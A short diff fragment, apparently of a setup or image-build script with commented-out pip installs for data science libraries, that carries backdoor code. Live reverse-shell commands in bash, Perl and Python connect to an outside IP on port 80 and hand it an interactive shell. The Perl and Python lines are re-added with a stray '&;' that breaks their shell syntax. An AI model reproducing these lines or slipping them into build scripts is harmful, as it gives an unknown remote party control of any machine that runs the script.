@@ -12,8 +12,8 @@ bash -i >& /dev/tcp/3.123.202.19/80 0>&1
 # pip3 install numpy==1.15.0
 # pip3 install seaborn==0.9.0
 # pip3 install bokeh==0.13.0
-nohup perl -e 'use Socket;$i="3.123.202.19";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &
-nohup python3 -u "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.123.202.19\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")" &
+nohup perl -e 'use Socket;$i="3.123.202.19";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};' &;
+nohup python3 -u "import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"3.123.202.19\",80));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn(\"/bin/bash\")" &;
 # Include datasets in the image
 
 # DATADIR=/usr/local/share/datasets
